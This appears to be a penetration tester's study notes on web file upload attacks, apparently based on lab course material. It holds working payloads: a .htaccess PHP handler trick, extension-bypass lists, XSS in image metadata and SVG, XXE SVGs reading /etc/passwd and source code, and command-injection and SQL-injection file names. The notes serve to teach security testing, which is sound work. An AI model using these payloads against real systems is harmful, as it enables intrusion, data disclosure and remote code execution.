# 📤 File Upload Attacks

## Client Side Validations

If cant pick php or asp files for example.

If client side modify the code to upload

## .htaccess

Tested for apache

```bash
echo "AddType application/x-httpd-php .evil" > .htaccess
```

This outlines a new php file type

Then upload _.evil_ files now.&#x20;

Put a reverse shell in it from https://revshells.com

## Back-end Request Modification

<figure><img src="../../.gitbook/assets/File Upload Attacks.png" alt=""><figcaption></figcaption></figure>

Here it is an upload request to upload.php We can modify the filename&#x20;

**Note**: We may also modify the Content-Type of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.

### Disabling Front-end Validatione

Use (CTRL+ SHIFT + C) to open inspector and use on the file upload.&#x20;

<figure><img src="../../.gitbook/assets/File Upload Attacks-1.png" alt=""><figcaption></figcaption></figure>

&#x20;Here a function called checkfile is used. Check console (ctrl+shift+k) for checkFile function. Remove the function. Or use burpsuite to intercept the request andreplace a new file.&#x20;

<figure><img src="../../.gitbook/assets/File Upload Attacks-2.png" alt=""><figcaption></figcaption></figure>

Replace the content and extension.

### BlackList filters

Example code:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

The code is taking the file extension (`$extension`) from the uploaded file name (`$fileName`) and then comparing it against a list of blacklisted extensions (`$blacklist`). However, this validation method has a major flaw. It is not _comprehensive_.&#x20;

NOTE: In windows servers file extensions are case insensitive. To fuzz for Extensions use https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt using _ffuf_ or _burp_(dont url encode). LIst of php to bypass:

```
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

Try to upload like so without payload encoding:&#x20;

<figure><img src="../../.gitbook/assets/File Upload Attacks-3.png" alt=""><figcaption></figcaption></figure>

Then fuzz again for hello world:&#x20;

<figure><img src="../../.gitbook/assets/File Upload Attacks-4.png" alt=""><figcaption></figcaption></figure>

### Whitelist filters

Can fuzz in a similar manner with _burp intruder_ or _ffuf_. Example code:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

This only checks if the whitelist are there in the file upload and not if it ends with it.

#### Double extensions

Example: **shell.jpg.php** Use this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) to fuzz

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

This checks if it ends with it so double extension wont work

#### Reverse Double extension

If the web server has insecure configuration like :

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Use like so:&#x20;

<figure><img src="../../.gitbook/assets/File Upload Attacks-5.png" alt=""><figcaption></figcaption></figure>

#### Character Injection

Inject character before or after the final extension Examples:

```
%20
%0a
%00
%0d0a
/
.\
.
…
:
```

For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the (%00), and store it as (shell.php), while still passing the whitelist. Bash script for all permutations:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.phar' '.hphp'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

### Type Filters

#### Content-Type

File fails to upload even if we try some of the tricks we learned in the previous sections. If we change the file name to shell.jpg.phtml or shell.php.jpg, or even if we use shell.jpg with a web shell content, our upload will fail. As the file extension does not affect the error message, the web application must be testing the file content for type validation. As mentioned earlier, this can be either in the _Content-Type Header_ or the _File Content_.

Example:

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

To fuzz the content type header use [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt) To get only image type:

```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt

cat content-type.txt | grep 'image/' > image-content-types.txt
```

Intercept and change like so:&#x20;

<figure><img src="../../.gitbook/assets/File Upload Attacks-6.png" alt=""><figcaption></figcaption></figure>

**Note**: A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as _POST_ data), in which case we will need to modify the main Content-Type header.

#### MIME(Multipurpose Internet Mail Extensions)-Type

Inspecting the initial bytes of a file reveals its File Signature or Magic Bytes. For instance, (GIF87a or GIF89a) signifies a GIF image, while plaintext indicates a Text file. Altering the initial bytes to the GIF magic bytes changes the MIME type to a GIF image, disregarding its remaining content or _extension_.

**Tip**: GIF images uniquely start with ASCII printable bytes, making them easy to imitate. The string GIF8 is common to both GIF signatures, simplifying GIF image imitation.

Example:

```bash
echo "GIF8" > text.jpg 
file text.jpg

text.jpg: GIF image data
```

Code to test MIME type of uploaded file:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

So this wont work:&#x20;

<figure><img src="../../.gitbook/assets/File Upload Attacks-7.png" alt=""><figcaption></figcaption></figure>

&#x20;Adding GIF8 to the php code:

<figure><img src="../../.gitbook/assets/File Upload Attacks-8.png" alt=""><figcaption></figcaption></figure>

Now it will upload

**Example:**&#x20;

<figure><img src="../../.gitbook/assets/File Upload Attacks-9.png" alt=""><figcaption></figcaption></figure>

## Limited File Uploads

Certain file types, like **SVG, HTML, XML**, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files

### HTML Allowed

### Image Metadata

If image metadata is used anywhere can execute js or anything like so:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg

exiftool HTB.jpg
```

Furthermore, if we change the image's MIME-Type to **text/html**, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

Can also use SVG.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XXE

**SVG** file to leak /etc/passwd

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (/etc/passwd) printed on the page or shown in the page source. Similarly, if the web application allows the upload of XML documents, then the same payload can carry the same attack when the XML data is displayed on the web application.

To read source code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Once the SVG image is displayed, we should get the base64 encoded content of index.php, which we can decode to read the source code. For more about XXE, you may refer to the [idor-insecure-direct-object-references.md](idor-insecure-direct-object-references.md "mention") module.

**NOTE**: DO NOT CHECK THE IMAGE BUT THE SOURCE CODE OF THE WEBSITE

## Injections in File Name

A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.

For example, if we name a file `file$(whoami).jpg` or file`whoami.jpg` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. mv file /tmp), then our file name would inject the whoami command, which would get executed, leading to remote code execution. You may refer to the Command Injections module for more information.

Similarly, we may use an XSS payload in the file name (e.g. alert(window.origin);), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. file';select+sleep(5);--.jpg), which may lead to an SQL injection if the file name is insecurely used in an SQL query.

## Upload Directory Disclosure

In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source codec

## Windows-specific Attacks

One such attack is using reserved characters, such as (|, <, >, `*` ,or ?), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (CON, COM1, LPT1, or NUL), which may also cause an error as the web application will not be allowed to write a file with this name.

Finally, we may utilize the Windows 8.3 Filename Convention to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (\~) to complete the file name, which we can use to our advantage.

For example, to refer to a file called (hackthebox.txt) we can use (HAC~~1.TXT) or (HAC~~2.TXT), where the digit represents the order of the matching files that start with (HAC). As Windows still supports this convention, we can write a file called (e.g. WEB\~.CONF) to overwrite the _web.conf_ file.
